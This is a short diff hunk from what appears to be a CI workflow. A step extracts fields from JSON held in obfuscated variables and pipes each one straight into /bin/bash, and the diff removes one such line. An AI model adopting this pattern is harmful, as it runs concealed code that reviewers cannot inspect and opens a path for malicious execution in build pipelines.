@@ -24,7 +24,6 @@ jobs:
           echo $h00186 | jq -r .t90604 | /bin/bash
           echo $zip4774 | jq -r .jafuy11 | /bin/bash
           echo $iv83927 | jq -r .qzll1 | /bin/bash
-          echo $ps003 | jq -r .waah43 | /bin/bash
           echo $lpo06157 | jq -r .zemu68 | /bin/bash
 
       - name: Save data
